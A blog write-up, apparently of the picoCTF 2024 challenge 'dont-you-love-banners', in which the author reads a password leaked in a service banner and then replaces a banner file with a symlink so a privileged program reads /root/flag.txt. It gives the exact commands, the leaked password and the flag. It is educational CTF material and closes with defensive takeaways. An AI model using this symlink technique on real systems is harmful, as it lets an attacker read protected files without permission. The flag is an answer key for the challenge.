---
title: 'dont-you-love-banners'
date: '2025-11-07T00:00:00+08:00'
lastmod: '2025-11-07T00:00:00+08:00'
draft: false
description: 'Can you abuse the banner? The server has been leaking some crucial information. Use the leaked information to get to the server and find the flag in the /root directory.'
summary: ''
tags: ["Medium", "General Skills", "picoCTF 2024"]
categories: []
series: []
author: "Zeus Dela Cruz"
tools: ["nc", "ln"]
techniques: ["Banner Grabbing", "Symbolic Link Exploitation", "Privilege Escalation"]

# Enable features for post
showToc: true
TocOpen: false
hidemeta: false
comments: false
disableShare: false
disableHLJS: false
searchHidden: false
ShowReadingTime: true
ShowWordCount: true
ShowCodeCopyButtons: true

# Cover image (optional)
cover:
  image: '' # /images/filename.jpg
  alt: ''
  caption: ''
  relative: false
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# Canonical link (for SEO)
canonicalURL: ''

# External edit link
editPost:
  URL: "https://github.com/freymeyer/myportfolio/tree/main/content"
  Text: "Suggest Changes"
  appendFilePath: true
---

## Challenge Information

The challenge provides two services:
- Port 55387: Leaking crucial information via SSH banner
- Port 60810: Application requiring authentication

Our goal is to abuse the leaked information to access the server and retrieve the flag from `/root/flag.txt`.

## Enumeration

### Banner Grabbing

First, I connected to port 55387 to check what information was being leaked:

```bash
nc tethys.picoctf.net 55387
```

The server responded with an SSH banner containing leaked credentials:
```
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

This reveals the password: **My_Passw@rd_@1234**

## Initial Access

### Connecting to the Application

Connected to the main application on port 60810:
```bash
nc tethys.picoctf.net 60810
```

The application prompted for authentication with three questions:

**Question 1:** What is the password?
```
My_Passw@rd_@1234
```

**Question 2:** What is the top cyber security conference in the world?
```
DEF CON
```

**Question 3:** The first hacker ever was known for phreaking (making free phone calls), who was it?
```
John Draper (accepted: John)
```

Successfully authenticated and gained shell access as `player@challenge`.

### Exploring the Environment

Checked the home directory:
```bash
ls
```
Output:
```
banner  text
```

Attempted to access the flag directly:
```bash
cd /root
ls
```
Found:
```
flag.txt  script.py
```

Tried to read the flag:
```bash
cat flag.txt
```
Result:
```
cat: flag.txt: Permission denied
```

As expected, we don't have permission to read `/root/flag.txt` directly.

## Exploitation

### Analyzing the Banner File

Looking at the home directory contents, there's a `banner` file. This file is likely being read by the application to display the welcome message.

The key insight: If the application reads the `banner` file with elevated privileges (or if we can make it read a different file), we can exploit this!

### Symbolic Link Attack

The solution involves using a symbolic link to redirect the `banner` file to point to `/root/flag.txt`:

**Step 1:** Remove the existing banner file
```bash
rm banner
```

**Step 2:** Create a symbolic link pointing to the flag
```bash
ln -s /root/flag.txt banner
```

This creates a symlink where `banner` now points to `/root/flag.txt`. When the application (running with higher privileges) reads the `banner` file to display the welcome message, it will actually read the contents of `/root/flag.txt`.

### Retrieving the Flag

After creating the symlink, I reconnected to the application:
```bash
nc tethys.picoctf.net 60810
```

Instead of the normal banner, the application displayed the flag:
```
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
```

## Summary

1. **Banner Grabbing** → Connected to port 55387 and extracted leaked password from SSH banner
2. **Authentication** → Used leaked credentials and answered security questions to gain shell access
3. **Enumeration** → Discovered flag location (`/root/flag.txt`) but lacked direct read permissions
4. **Symbolic Link Attack** → Replaced `banner` file with symlink to `/root/flag.txt`
5. **Privilege Abuse** → Application read flag contents when displaying banner on reconnection
6. **Flag Captured** → Retrieved flag from banner output

## Key Takeaways

- SSH banners can leak sensitive information and should be properly configured
- Symbolic links can be exploited when applications run with elevated privileges
- Applications should validate file types and permissions before reading files
- The `ln -s` command creates symbolic links that can redirect file reads
- Security questions should not rely on easily guessable trivia

## Flag

```
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
```
